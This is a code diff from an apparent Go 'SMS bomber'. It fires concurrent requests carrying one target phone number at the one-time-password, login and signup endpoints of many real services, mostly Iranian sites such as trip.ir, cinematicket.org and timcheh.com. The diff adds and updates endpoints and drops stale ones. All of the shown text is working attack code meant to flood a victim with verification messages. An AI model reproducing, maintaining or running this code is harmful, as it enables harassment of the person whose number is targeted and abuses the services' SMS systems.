@@ -446,24 +446,27 @@ func main() {
 		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)  // edit :4/22/2025
+		go sms("https://client.api.paklean.com/download", map[string]interface{}{
+			"tel": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://beta.raghamapp.com/auth", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://client.api.paklean.com/user/resendCode", map[string]interface{}{
-			"username": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://mobogift.com/signin", map[string]interface{}{
 			"username": phone,
-		}, ch)
-		go sms("https://tj8.ir/auth/register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
-			"mobileNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://cinematicket.org/api/v1/users/otp", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
 			"phone_number": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://www.irantic.com/api/login/request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -781,18 +784,6 @@ func main() {
 		s56 := fmt.Sprintf("'mobile':%s,'deviceTypeCode':0,'confirmTerms':'True','notRobot':'False'", phone)
 		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
 			s56: phone,
-		}, ch)
-		go sms("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{
-			"username": phone,
-		}, ch)
-		go sms("https://web.raghamapp.com/api/users/code", map[string]interface{}{
-			"phone": phone,
-		}, ch)
-		go sms("https://gateway.trip.ir/api/registers", map[string]interface{}{
-			"CellPhone": phone,
-		}, ch)
-		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
-			"PhoneNumber": phone,
 		}, ch)
 
 	}
